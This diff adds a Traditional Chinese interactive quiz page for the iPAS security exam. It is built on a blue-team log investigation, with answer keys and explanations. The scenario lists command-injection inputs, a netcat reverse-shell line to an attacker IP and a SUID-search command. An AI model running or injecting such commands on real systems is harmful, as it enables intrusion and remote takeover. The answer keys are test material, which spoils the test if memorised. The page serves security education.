@@ -1,0 +1,1097 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iPAS 資安題組：指令注入與權限提升分析</title>
+    <style>
+        :root {
+            /* 標籤系統配色 */
+            --tag-law: #607d8b;
+            --tag-iso: #27ae60;
+            --tag-zt: #8e44ad;
+            --tag-net: #2980b9;
+            --tag-sec: #c0392b;
+            --tag-mgm: #d35400;
+
+            /* UI 系統色 */
+            --primary-bg: #f4f6f8;
+            --card-bg: #ffffff;
+            --text-main: #2c3e50;
+            --text-sub: #7f8c8d;
+            --accent: #3498db;
+            --success: #2ecc71;
+            --error: #e74c3c;
+            --locked: #95a5a6;
+            
+            /* 狀態背景 */
+            --bg-correct: #e8f5e9;
+            --bg-wrong: #fce4ec;
+            
+            /* 字體 */
+            --font-stack: system-ui, "Noto Sans TC", "Microsoft JhengHei", sans-serif;
+        }
+
+        * {
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            font-family: var(--font-stack);
+            background-color: var(--primary-bg);
+            color: var(--text-main);
+            margin: 0;
+            padding: 20px;
+            line-height: 1.6;
+            font-size: 16px;
+        }
+
+        /* 容器與佈局 */
+        .container {
+            max-width: 960px;
+            margin: 0 auto;
+            padding-bottom: 60px;
+        }
+
+        /* 頁首 Header */
+        header {
+            background: var(--card-bg);
+            padding: 20px;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            margin-bottom: 24px;
+            position: relative;
+        }
+
+        .header-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+
+        h1 {
+            margin: 0;
+            font-size: 1.4rem;
+            color: var(--text-main);
+        }
+
+        .progress-stat {
+            font-weight: bold;
+            color: var(--accent);
+            font-family: monospace;
+            font-size: 1.1rem;
+        }
+
+        .progress-track {
+            height: 8px;
+            background: #eee;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, var(--accent), #2980b9);
+            transition: width 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        /* 題組背景 (Global Context) */
+        .group-scenario {
+            background: #e3f2fd;
+            border-left: 5px solid var(--accent);
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 24px;
+            font-size: 0.95rem;
+        }
+        
+        .scenario-label {
+            font-weight: bold;
+            color: var(--tag-net);
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        .code-block {
+            background: #2c3e50;
+            color: #ecf0f1;
+            padding: 12px;
+            border-radius: 6px;
+            font-family: monospace;
+            margin: 10px 0;
+            overflow-x: auto;
+            border: 1px solid #34495e;
+        }
+
+        /* Tabs 分頁切換 */
+        .tabs {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 24px;
+            overflow-x: auto;
+            padding-bottom: 4px;
+            scrollbar-width: none; /* Firefox */
+        }
+        .tabs::-webkit-scrollbar { display: none; } /* Chrome/Safari */
+
+        .tab-btn {
+            padding: 10px 20px;
+            border: none;
+            background: #e0e0e0;
+            border-radius: 24px;
+            cursor: pointer;
+            white-space: nowrap;
+            font-weight: bold;
+            color: #666;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            min-height: 48px; /* 觸控友善 */
+        }
+
+        .tab-btn.active {
+            background: var(--text-main);
+            color: white;
+            box-shadow: 0 4px 10px rgba(44, 62, 80, 0.3);
+        }
+
+        .tab-btn.correct { background: var(--success); color: white; }
+        .tab-btn.wrong { background: var(--error); color: white; }
+
+        /* 卡片設計 */
+        .card {
+            background: var(--card-bg);
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            padding: 24px;
+            margin-bottom: 24px;
+            display: none; /* 預設隱藏，由 JS 控制顯示 */
+            animation: fadeIn 0.4s ease;
+        }
+
+        .card.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* 題目內容 */
+        .q-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 16px;
+        }
+
+        .q-tag {
+            font-size: 0.8rem;
+            padding: 4px 10px;
+            border-radius: 4px;
+            color: white;
+            font-weight: bold;
+            background: var(--tag-sec); /* 預設 */
+        }
+        /* Tag classes dynamically applied via JS */
+        .tag-law { background: var(--tag-law); }
+        .tag-iso { background: var(--tag-iso); }
+        .tag-zt { background: var(--tag-zt); }
+        .tag-net { background: var(--tag-net); }
+        .tag-sec { background: var(--tag-sec); }
+        .tag-mgm { background: var(--tag-mgm); }
+
+        .q-text {
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+
+        /* 關鍵字強調 - 紅色加粗 */
+        .highlight-negative {
+            color: #c0392b;
+            font-weight: 900;
+            text-decoration: underline;
+            text-decoration-thickness: 2px;
+        }
+
+        /* 選項區域 */
+        .options-area {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .option-label {
+            display: flex;
+            align-items: center;
+            padding: 16px;
+            border: 2px solid #eee;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.2s;
+            position: relative;
+            background: #fff;
+            min-height: 44px; /* 觸控友善 */
+        }
+
+        .option-label:hover:not(.disabled) {
+            border-color: var(--accent);
+            background: #fbfbfb;
+        }
+
+        .option-label.disabled {
+            cursor: not-allowed;
+            opacity: 0.9;
+        }
+
+        /* 選項代號 (A, B, C...) */
+        .opt-code {
+            font-weight: bold;
+            margin-right: 12px;
+            color: var(--accent);
+            min-width: 24px;
+        }
+
+        .option-input {
+            position: absolute;
+            opacity: 0;
+            height: 0;
+            width: 0;
+        }
+
+        /* 選項選中與對錯樣式 */
+        .option-label.selected {
+            border-color: var(--accent);
+            background-color: #e3f2fd;
+        }
+
+        .option-label.correct {
+            border-color: var(--success);
+            background-color: var(--bg-correct);
+            color: #1b5e20;
+        }
+        .option-label.correct .opt-code { color: #1b5e20; }
+        .option-label.correct::after {
+            content: "✓";
+            position: absolute;
+            right: 15px;
+            font-weight: bold;
+            color: var(--success);
+        }
+
+        .option-label.wrong {
+            border-color: var(--error);
+            background-color: var(--bg-wrong);
+            color: #b71c1c;
+        }
+        .option-label.wrong .opt-code { color: #b71c1c; }
+        .option-label.wrong::after {
+            content: "✕";
+            position: absolute;
+            right: 15px;
+            font-weight: bold;
+            color: var(--error);
+        }
+
+        /* 判定按鈕區 */
+        .action-area {
+            margin-top: 24px;
+            display: flex;
+            justify-content: flex-end;
+        }
+
+        .btn {
+            padding: 12px 32px;
+            border-radius: 30px;
+            border: none;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.1s;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        .btn:active { transform: scale(0.98); }
+
+        .btn-submit { background: var(--text-main); color: white; }
+        .btn-retry { background: var(--locked); color: white; display: none; }
+
+        /* 新版詳解區塊樣式 */
+        .explain-section {
+            margin-top: 30px;
+            border-top: 2px dashed #e0e0e0;
+            padding-top: 20px;
+            display: none;
+        }
+
+        .step-block {
+            margin-bottom: 20px;
+            background: #fff;
+            border: 1px solid #eee;
+            border-radius: 8px;
+            padding: 16px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.03);
+        }
+
+        .step-title {
+            font-weight: bold;
+            color: var(--accent);
+            font-size: 1.05rem;
+            margin-bottom: 10px;
+            border-bottom: 2px solid var(--accent);
+            display: inline-block;
+            padding-bottom: 2px;
+        }
+
+        .step-content {
+            font-size: 0.95rem;
+            color: #444;
+            line-height: 1.7;
+        }
+
+        .step-content ul {
+            padding-left: 20px;
+            margin: 8px 0;
+        }
+
+        .highlight-box {
+            background: #fdf2e9;
+            border-left: 4px solid #d35400;
+            padding: 10px 15px;
+            margin: 10px 0;
+            border-radius: 4px;
+        }
+        
+        .keyword-badge {
+            display: inline-block;
+            background: #e8f6f3;
+            color: #16a085;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-family: monospace;
+            font-weight: bold;
+            margin-right: 5px;
+        }
+
+        /* 選項分析表格 */
+        .option-analysis-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 10px;
+        }
+        .option-analysis-table td {
+            padding: 8px;
+            border-bottom: 1px solid #eee;
+            vertical-align: top;
+        }
+        .oa-label { font-weight: bold; color: var(--accent); white-space: nowrap; width: 40px; }
+        .oa-status { font-weight: bold; font-size: 0.8rem; padding: 2px 6px; border-radius: 4px; margin-right: 5px; white-space: nowrap;}
+        .oa-correct { background: #e8f5e9; color: #2ecc71; }
+        .oa-wrong { background: #ffebee; color: #e74c3c; }
+
+        /* 自我檢測樣式 */
+        .self-check-container {
+            margin-top: 20px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 15px;
+            border: 1px solid #e9ecef;
+        }
+        
+        .self-check-title {
+            font-weight: bold;
+            color: var(--text-main);
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+        }
+        .self-check-title::before {
+            content: "🧠";
+            margin-right: 8px;
+        }
+
+        .sc-item {
+            margin-bottom: 15px;
+            border-bottom: 1px dashed #ced4da;
+            padding-bottom: 10px;
+        }
+        .sc-item:last-child { border-bottom: none; }
+
+        .sc-question { font-weight: 600; margin-bottom: 8px; color: #34495e; }
+        
+        .sc-answer-btn {
+            background: #95a5a6;
+            color: white;
+            border: none;
+            padding: 4px 12px;
+            border-radius: 12px;
+            font-size: 0.85rem;
+            cursor: pointer;
+        }
+        
+        .sc-answer-content {
+            margin-top: 8px;
+            color: var(--success);
+            font-weight: bold;
+            display: none;
+            background: #fff;
+            padding: 8px;
+            border-radius: 4px;
+            border-left: 3px solid var(--success);
+        }
+
+        /* 手機版適應 */
+        @media (max-width: 768px) {
+            body { padding: 10px; }
+            .container { width: 100%; }
+            .tabs { margin-left: -10px; margin-right: -10px; padding-left: 10px; padding-right: 10px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <header>
+        <div class="header-top">
+            <h1>iPAS 資安實務題組解析</h1>
+            <div class="progress-stat"><span id="completed-count">0</span> / <span id="total-count">0</span></div>
+        </div>
+        <div class="progress-track">
+            <div class="progress-bar" id="global-progress"></div>
+        </div>
+    </header>
+
+    <div class="group-scenario">
+        <span class="scenario-label">【題組情境】Blue Team 事件調查</span>
+        <p>你是企業藍隊（防禦方）人員，正在調查一台疑似遭到攻擊的 Web 伺服器。SOC（資安監控中心）發出告警，指出該伺服器的 Ping 功能（測試網路連線工具）出現異常流量。你在應用程式日誌（App Logs）與系統指令日誌（Command Logs）中發現了以下可疑紀錄：</p>
+        <div class="code-block">
+127.0.0.1; sleep 5
+127.0.0.1; whoami
+127.0.0.1; /bin/bash -i 2>&1 | nc 192.168.99.100 80 > /tmp/tmp.txt
+find / -perm -u=s -type f 2>/dev/null
+        </div>
+        <p>請根據這些日誌線索，回答下列第 33 至 36 題。</p>
+    </div>
+
+    <!-- 導航分頁 -->
+    <div class="tabs" id="tabs-container">
+        <!-- JS 動態生成 -->
+    </div>
+
+    <!-- 題目容器 -->
+    <div id="questions-container">
+        <!-- JS 動態生成 -->
+    </div>
+
+</div>
+
+<script>
+// ==========================================
+// 1. 資料定義 (Data Model)
+// ==========================================
+const quizData = {
+  "groupTitle": "指令注入與權限提升",
+  "questions": [
+    {
+      "id": 33,
+      "tag": "tech",
+      "tagName": "Web 攻擊技術",
+      "type": "single",
+      "text": "日誌中出現「127.0.0.1; sleep 5」，請問攻擊者最可能正在測試下列哪一種攻擊情境？",
+      "options": [
+        "攻擊者想確認該功能是否存在資料庫注入攻擊（SQL Injection）",
+        "攻擊者想確認該功能是否存在反序列化攻擊（Insecure Deserialization）",
+        "攻擊者想確認該功能是否存在指令注入攻擊（Command Injection）",
+        "攻擊者想確認該功能是否存在資安記錄及監控失效（Security Logging Failures）"
+      ],
+      "correctIndex": 2, // (C)
+      "explanation": {
+          "keywords": [
+              { "word": ";", "desc": "指令分隔符號 (Linux/Unix)" },
+              { "word": "sleep 5", "desc": "時間延遲指令 (Time Delay)" },
+              { "word": "127.0.0.1", "desc": "正常輸入掩護" }
+          ],
+          "translation": "「系統你好，請幫我 Ping 這個 IP，做完之後，<strong>順便睡個 5 秒鐘</strong>。」",
+          "logic": {
+              "steps": [
+                  "攻擊者在正常參數後加入分號「;」，試圖串接第二個指令。",
+                  "第二個指令是「sleep 5」，這是一個作業系統層級的指令。",
+                  "如果網頁回應真的停頓了 5 秒，代表系統真的執行了這個「額外指令」。",
+                  "這種手法稱為「盲注測試（Blind Injection）」，用來確認漏洞是否存在。"
+              ],
+              "principle": "指令注入（Command Injection）發生在應用程式直接將使用者輸入傳遞給系統 Shell 執行，且未過濾特殊符號（如 ; | &）。",
+              "example": "就像你在餐廳點餐單上寫：「我要一份炒飯；<strong>順便把收銀機打開</strong>」。如果店員真的去開收銀機，就代表這家店的流程有漏洞。"
+          },
+          "options_analysis": [
+              { "idx": 0, "status": "wrong", "reason": "SQL Injection 通常會出現單引號 (')、OR 1=1 或資料庫語法 (SELECT, UNION)，而非系統指令。" },
+              { "idx": 1, "status": "wrong", "reason": "反序列化攻擊通常涉及經過編碼的物件資料串 (Serialized Object)，特徵碼完全不同。" },
+              { "idx": 2, "status": "correct", "reason": "符合特徵：使用分號串接 OS 指令 (sleep)，直接操作作業系統。" },
+              { "idx": 3, "status": "wrong", "reason": "這是管理疏失的風險分類名稱 (OWASP Top 10)，不是具體的攻擊語法。" }
+          ],
+          "supplement": {
+              "content": "指令注入常見的分隔符號包括： `;` (接續執行)、`|` (管線輸出)、`&&` (前成功才執行後)、`||` (前失敗才執行後)。",
+              "definition": "Command Injection：指攻擊者透過應用程式輸入位元組，在主機作業系統上執行任意指令。"
+          },
+          "analogy": "SQL Injection 是騙「資料庫」說話；Command Injection 是騙「作業系統」做事。",
+          "mnemonics": "看到分號加指令，就是 Command Injection；sleep 是用來試水溫的。",
+          "traps": {
+              "blind_spot": "看到「注入」兩個字就直覺選 SQL Injection，忽略了後面的指令內容是 OS 層級的。",
+              "guide": "判斷關鍵在於「注入了什麼語言」？注入 SQL 語法 = SQLi；注入 Shell 指令 = CMDi。"
+          },
+          "self_check": [
+              { "q": "如果日誌改成 `127.0.0.1 && id`，這是什麼攻擊？", "a": "一樣是 Command Injection。&& 代表前面的 Ping 成功後，接著執行 id 指令。" },
+              { "q": "為什麼攻擊者喜歡用 sleep 測試？", "a": "因為如果不確定是否有回顯（螢幕上不一定看得到結果），用時間延遲（卡住幾秒）是最直觀的判斷方式。" }
+          ]
+      }
+    },
+    {
+      "id": 34,
+      "tag": "tech",
+      "tagName": "權限評估",
+      "type": "single",
+      "text": "日誌中出現「127.0.0.1; whoami」，請問攻擊者想要評估下列何項資訊？",
+      "options": [
+        "評估此作業系統版本是否有現成的漏洞可以利用",
+        "評估該使用者是否有足夠的權限可以存取機敏資料",
+        "評估該使用者的群組是否有足夠的權限可以存取機敏資料",
+        "評估當下的系統路徑位於哪個目錄中"
+      ],
+      "correctIndex": 1, 
+      "explanation": {
+          "keywords": [
+              { "word": "whoami", "desc": "Linux 標準指令：我是誰？" }
+          ],
+          "translation": "「系統請告訴我，現在幫我執行程式的這個帳號名字叫什麼？」",
+          "logic": {
+              "steps": [
+                  "攻擊者確認指令注入漏洞存在後，下一步是「權限盤點」。",
+                  "執行 `whoami` 會回傳使用者名稱（例如 `root`, `www-data`, `admin`）。",
+                  "使用者名稱直接決定了權限大小（能否讀取 /etc/shadow、能否寫入檔案等）。"
+              ],
+              "principle": "最小權限原則（Least Privilege）：Web 服務應該使用低權限帳號（如 www-data）運行，以降低被入侵後的損害。",
+              "example": "就像闖空門的小偷進屋後，先看看自己穿的是「清潔工制服」還是「總經理西裝」，決定能進哪些房間。"
+          },
+          "options_analysis": [
+              { "idx": 0, "status": "wrong", "reason": "查 OS 版本通常用 `uname -a` 或 `cat /etc/*release`。" },
+              { "idx": 1, "status": "correct", "reason": "確認「我是誰」就是在確認「我有什麼權限」。" },
+              { "idx": 2, "status": "wrong", "reason": "查群組通常使用 `id` 或 `groups` 指令，whoami 主要只顯示名稱。" },
+              { "idx": 3, "status": "wrong", "reason": "查路徑使用 `pwd` (Print Working Directory)。" }
+          ],
+          "supplement": {
+              "content": "若回傳 `root`，代表攻擊者擁有最高權限（God Mode）；若回傳 `www-data` 或 `apache`，則權限受限，通常需要進一步提權（Privilege Escalation）。",
+              "definition": "Situational Awareness (情境感知)：攻擊者入侵後確認環境與自身權限的過程。"
+          },
+          "analogy": "whoami 是看身份證；pwd 是看導航地圖；id 是看會員卡等級。",
+          "mnemonics": "whoami 問身分，推權限；id 看群組，pwd 看路徑。",
+          "traps": {
+              "blind_spot": "容易混淆「使用者名稱」與「群組」或「路徑」的指令對應關係。",
+              "guide": "看到 whoami 直譯就是「Who am I」，跟地點（路徑）或版本無關。"
+          },
+          "self_check": [
+              { "q": "如果攻擊者執行 `id`，他能多看到什麼資訊？", "a": "除了使用者 ID (uid)，還能看到群組 ID (gid) 以及所屬的補充群組，資訊比 whoami 更詳細。" },
+              { "q": "為什麼攻擊者很在意是不是 root？", "a": "因為 root 可以任意讀寫系統檔案、安裝後門、清除日誌，完全控制整台機器。" }
+          ]
+      }
+    },
+    {
+      "id": 35,
+      "tag": "net",
+      "tagName": "惡意連線分析",
+      "type": "single",
+      "text": "日誌中出現「... /bin/bash -i ... | nc 192.168.99.100 80 ...」，這段指令最可能代表什麼攻擊情境？",
+      "options": [
+        "攻擊者想要勘查 192.168.99.100 的 80 port 是否可進行連線",
+        "攻擊者想要讀取 /bin/bash 這個檔案內容並輸出",
+        "攻擊者想要透過 nc 進行反向連線（Reverse Shell），取得遠端控制權",
+        "攻擊者想要讀取作業系統版本資訊以尋找漏洞"
+      ],
+      "correctIndex": 2,
+      "explanation": {
+          "keywords": [
+              { "word": "bash -i", "desc": "啟動互動式 Shell (Interactive)" },
+              { "word": "|", "desc": "管線：把左邊結果傳給右邊" },
+              { "word": "nc", "desc": "Netcat：網路瑞士刀，建立連線用" },
+              { "word": "192.168.99.100", "desc": "攻擊者的 IP (外部)" }
+          ],
+          "translation": "「請啟動一個終端機介面 (bash)，並把它『接』到遠端的攻擊者電腦上，讓攻擊者可以直接下指令控制我。」",
+          "logic": {
+              "steps": [
+                  "攻擊者利用 `bash -i` 產生一個可輸入指令的環境。",
+                  "透過 `nc` (Netcat) 連線到攻擊者的 IP。",
+                  "將 bash 的輸入/輸出 (I/O) 轉導給攻擊者。",
+                  "因為是由內部主動連出去，所以稱為「反向 (Reverse)」連線。"
+              ],
+              "principle": "反向 Shell (Reverse Shell)：利用防火牆通常「擋入不擋出」的特性，由受害端主動連線回攻擊端，藉此繞過防火牆限制。",
+              "example": "就像小偷在你家裝了內線電話，叫你主動打給他聽候差遣。警衛（防火牆）會擋外來電話，但通常不會擋你打出去的電話。"
+          },
+          "options_analysis": [
+              { "idx": 0, "status": "wrong", "reason": "單純勘查 Port 不需啟動 `bash -i`，通常用 `nc -z` 或 `curl`。" },
+              { "idx": 1, "status": "wrong", "reason": "讀取檔案是用 `cat` 或 `less`，不是執行該程式。" },
+              { "idx": 2, "status": "correct", "reason": "特徵完全符合：Shell + 網路連線 + 導向 = 遠端控制 (Reverse Shell)。" },
+              { "idx": 3, "status": "wrong", "reason": "查版本與網路連線工具 nc 無直接關聯。" }
+          ],
+          "supplement": {
+              "content": "攻擊者選擇 Port 80 是為了偽裝成正常的 Web 流量，降低被防火牆阻擋的機率。",
+              "definition": "Reverse Shell：Target connects back to Attacker. Bind Shell：Attacker connects to Target."
+          },
+          "analogy": "Bind Shell 是你開門等小偷進來；Reverse Shell 是你打電話請小偷教你做事。",
+          "mnemonics": "bash 加 nc，八成是反彈 shell；受害者主動連出，就是反向連線。",
+          "traps": {
+              "blind_spot": "看到 Port 80 就以為是瀏覽網頁。",
+              "guide": "不要只看 Port，要看指令組合。`bash` + `nc` 是危險訊號。"
+          },
+          "self_check": [
+              { "q": "為什麼不直接連進去 (Bind Shell) 就好？", "a": "因為企業防火牆通常會封鎖外部主動連入的連線 (Inbound Block)，直接連會失敗。" },
+              { "q": "除了 nc，還有什麼工具可以做 Reverse Shell？", "a": "很多，例如 Python, PHP, Perl, Ruby 甚至 Powershell 都可以寫出類似功能的腳本。" }
+          ]
+      }
+    },
+    {
+      "id": 36,
+      "tag": "tech",
+      "tagName": "Linux 提權偵察",
+      "type": "multi", // 複選題
+      "text": "日誌中出現「find / -perm -u=s ...」，請問攻擊者執行此指令「最不可能」做下列哪些攻擊行為？（複選）",
+      "options": [
+        "尋找有被設定 setuid 的檔案，嘗試提升成為 root 權限",
+        "尋找有被設定 setgid 的檔案，嘗試提升成為 root 權限",
+        "尋找有被設定 sticky bit 的目錄，嘗試利用檔案提權",
+        "尋找有被設定為 root:root 的檔案與目錄，確認機敏資料位置"
+      ],
+      "correctIndex": [1, 2, 3], // 題目問「最不可能」
+      "explanation": {
+          "keywords": [
+              { "word": "find /", "desc": "從根目錄開始搜尋" },
+              { "word": "-perm", "desc": "搜尋特定權限 (Permission)" },
+              { "word": "-u=s", "desc": "User 權限設為 SetUID (s)" }
+          ],
+          "translation": "「系統請幫我找一下，全電腦裡面有哪些檔案是被設定了 SUID 特權的？」",
+          "logic": {
+              "steps": [
+                  "指令指定參數 `-u=s`，這明確是找 SetUID (SUID) 檔案。",
+                  "SUID 的功能是：執行該檔案時，暫時擁有「檔案擁有者（通常是 root）」的權限。",
+                  "攻擊者找這個是為了利用這些檔案的漏洞進行「權限提升」。",
+                  "題目問「最不可能」，所以我們要選「跟 SUID 無關」的選項。"
+              ],
+              "principle": "SUID (Set User ID)：Linux 特殊權限位元。例如 `passwd` 指令需要 root 權限改密碼，所以它有 SUID，讓一般使用者執行時瞬間變身 root。",
+              "example": "SUID 就像一把「尚方寶劍」，見劍如見皇上。拿到這把劍（執行這個檔），你暫時就是皇上（Root）。"
+          },
+          "options_analysis": [
+              { "idx": 0, "status": "wrong", "reason": "這是該指令的唯一目的（找 setuid），所以是「最可能」，不選。" },
+              { "idx": 1, "status": "correct", "reason": "找 setgid 需要用 `-g=s` 參數。此指令找不到。" },
+              { "idx": 2, "status": "correct", "reason": "找 sticky bit 需要用 `+t` 或權限碼 1000。此指令找不到。" },
+              { "idx": 3, "status": "correct", "reason": "找 root 擁有者需要用 `-user root` 參數。此指令只看權限位元，不看擁有者。" }
+          ],
+          "supplement": {
+              "content": "權限代號對照：SUID (4000, u+s), SGID (2000, g+s), Sticky (1000, +t)。",
+              "definition": "Privilege Escalation (提權)：從低權限帳號（如 www-data）攻擊漏洞變成高權限帳號（如 root）的過程。"
+          },
+          "analogy": "指令是「找尚方寶劍(-u=s)」，所以不可能是在「找免死金牌(-g=s)」或「找玉璽(-user root)」。",
+          "mnemonics": "-u 是 User (SUID)，-g 是 Group (SGID)；題目問不可能，把無關的都勾起來。",
+          "traps": {
+              "blind_spot": "看到 root 選項就覺得很危險，以為是駭客在找的。雖然駭客確實想找 root 檔，但「這個特定指令」做不到。",
+              "guide": "精確對應指令參數：u=s 就是 SUID，其他都別腦補。"
+          },
+          "self_check": [
+              { "q": "SUID 檔案為什麼危險？", "a": "因為如果該程式寫得不好（有漏洞），攻擊者就能利用它以 Root 身分執行惡意代碼。" },
+              { "q": "如何防禦 SUID 提權？", "a": "定期掃描系統中不必要的 SUID 檔案並移除權限；掛載分割區時使用 `nosuid` 參數。" }
+          ]
+      }
+    }
+  ]
+};
+
+// ==========================================
+// 2. 核心邏輯 (App Logic)
+// ==========================================
+
+const state = {
+    results: new Array(quizData.questions.length).fill(null), // null: 未答, true: 對, false: 錯
+    currentTab: 0
+};
+
+// 初始化
+function init() {
+    renderTabs();
+    renderQuestions();
+    updateProgress();
+    
+    // 預設顯示第一題
+    switchTab(0);
+}
+
+// 渲染分頁籤
+function renderTabs() {
+    const container = document.getElementById('tabs-container');
+    container.innerHTML = quizData.questions.map((q, index) => `
+        <button class="tab-btn" id="tab-${index}" onclick="switchTab(${index})">
+            <span>Q${q.id}</span>
+            <span class="status-icon"></span>
+        </button>
+    `).join('');
+}
+
+// Fisher-Yates Shuffle
+function shuffle(array) {
+    let currentIndex = array.length, randomIndex;
+    // 複製陣列以免修改原始資料
+    const newArray = [...array]; 
+    while (currentIndex != 0) {
+        randomIndex = Math.floor(Math.random() * currentIndex);
+        currentIndex--;
+        [newArray[currentIndex], newArray[randomIndex]] = [newArray[randomIndex], newArray[currentIndex]];
+    }
+    return newArray;
+}
+
+// 處理題目文字中的關鍵字強調
+function highlightKeywords(text) {
+    const negativeWords = ["不正確", "不是", "錯誤", "最不適用", "最不可能"];
+    let processedText = text;
+    negativeWords.forEach(word => {
+        const regex = new RegExp(word, 'g');
+        processedText = processedText.replace(regex, `<span class="highlight-negative">${word}</span>`);
+    });
+    return processedText;
+}
+
+// 渲染題目卡片
+function renderQuestions() {
+    const container = document.getElementById('questions-container');
+    
+    container.innerHTML = quizData.questions.map((q, index) => {
+        // 1. 處理選項隨機化
+        let optionsObj = q.options.map((opt, i) => ({ text: opt, originalIndex: i }));
+        optionsObj = shuffle(optionsObj);
+        
+        // 2. 決定 Tag 顏色 Class
+        const tagClass = `tag-${q.tag}`;
+
+        // 3. 準備詳解內容
+        const exp = q.explanation;
+        
+        // 渲染 HTML
+        return `
+        <div class="card" id="card-${index}">
+            <div class="q-header">
+                <span class="q-tag ${tagClass}">${q.tagName}</span>
+                <span style="color: #999; font-size: 0.9rem;">${q.type === 'multi' ? '複選題' : '單選題'}</span>
+            </div>
+            
+            <div class="q-text">
+                ${q.id}. ${highlightKeywords(q.text)}
+            </div>
+
+            <div class="options-area" id="options-area-${index}" data-type="${q.type}">
+                ${optionsObj.map((opt, i) => {
+                    let isCorrect = false;
+                    if (Array.isArray(q.correctIndex)) {
+                        isCorrect = q.correctIndex.includes(opt.originalIndex);
+                    } else {
+                        isCorrect = q.correctIndex === opt.originalIndex;
+                    }
+                    const char = String.fromCharCode(65 + i);
+                    return `
+                    <label class="option-label" data-correct="${isCorrect}">
+                        <span class="opt-code">${char}</span>
+                        <input type="${q.type === 'multi' ? 'checkbox' : 'radio'}" 
+                               name="q-${index}" 
+                               class="option-input" 
+                               value="${i}">
+                        <span>${opt.text}</span>
+                    </label>
+                    `;
+                }).join('')}
+            </div>
+
+            <div class="action-area">
+                <button class="btn btn-submit" id="submit-${index}" onclick="submitAnswer(${index})">送出答案</button>
+                <button class="btn btn-retry" id="retry-${index}" onclick="resetQuestion(${index})">重新作答</button>
+            </div>
+
+            <div class="explain-section" id="explain-${index}">
+                
+                <!-- 第一步：找關鍵字 -->
+                <div class="step-block">
+                    <div class="step-title">第一步：找關鍵字</div>
+                    <div class="step-content">
+                        ${exp.keywords.map(k => `<div><span class="keyword-badge">${k.word}</span> ${k.desc}</div>`).join('')}
+                    </div>
+                </div>
+
+                <!-- 第二步：白話翻譯 -->
+                <div class="step-block">
+                    <div class="step-title">第二步：白話翻譯</div>
+                    <div class="step-content highlight-box">
+                        ${exp.translation}
+                    </div>
+                </div>
+
+                <!-- 第三步：解題思路 -->
+                <div class="step-block">
+                    <div class="step-title">第三步：解題思路</div>
+                    <div class="step-content">
+                        <strong>邏輯拆解：</strong>
+                        <ul>${exp.logic.steps.map(s => `<li>${s}</li>`).join('')}</ul>
+                        <div style="margin-top:10px;"><strong>原理與規則：</strong>${exp.logic.principle}</div>
+                        <div style="margin-top:10px; color:#2980b9;"><strong>生活例子：</strong>${exp.logic.example}</div>
+                    </div>
+                </div>
+
+                <!-- 第四步：選項分析 -->
+                <div class="step-block">
+                    <div class="step-title">第四步：選項分析</div>
+                    <div class="step-content">
+                        <table class="option-analysis-table">
+                            ${exp.options_analysis.map(oa => `
+                            <tr>
+                                <td class="oa-label">(${String.fromCharCode(65 + oa.idx)})</td>
+                                <td>
+                                    <span class="oa-status ${oa.status === 'correct' ? 'oa-correct' : 'oa-wrong'}">${oa.status === 'correct' ? '正解' : '錯誤'}</span>
+                                    ${oa.reason}
+                                </td>
+                            </tr>
+                            `).join('')}
+                        </table>
+                    </div>
+                </div>
+
+                <!-- 觀念補充與延伸 -->
+                <div class="step-block">
+                    <div class="step-title">觀念補充與延伸</div>
+                    <div class="step-content">
+                        <p>${exp.supplement.content}</p>
+                        <div class="highlight-box" style="background:#eaf2f8; border-left-color:#3498db;">
+                            <strong>定義：</strong>${exp.supplement.definition}
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 觸類旁通 -->
+                <div class="step-block">
+                    <div class="step-title">觸類旁通（舉一反三）</div>
+                    <div class="step-content">
+                        ${exp.analogy}
+                    </div>
+                </div>
+
+                <!-- 記憶口訣 -->
+                <div class="step-block" style="border-left: 5px solid #f1c40f;">
+                    <div class="step-title" style="color: #d35400; border-color: #f1c40f;">記憶口訣</div>
+                    <div class="step-content" style="font-size: 1.1rem; font-weight: bold; color: #d35400;">
+                        ${exp.mnemonics}
+                    </div>
+                </div>
+
+                <!-- 常見陷阱 -->
+                <div class="step-block">
+                    <div class="step-title">常見陷阱</div>
+                    <div class="step-content">
+                        <p><strong>心理盲點：</strong>${exp.traps.blind_spot}</p>
+                        <p><strong>避坑指南：</strong>${exp.traps.guide}</p>
+                    </div>
+                </div>
+
+                <!-- 自我檢測 -->
+                <div class="self-check-container">
+                    <div class="self-check-title">自我檢測</div>
+                    ${exp.self_check.map((sc, scIdx) => `
+                    <div class="sc-item">
+                        <div class="sc-question">Q${scIdx+1}: ${sc.q}</div>
+                        <button class="sc-answer-btn" onclick="toggleSelfAnswer(this)">顯示答案</button>
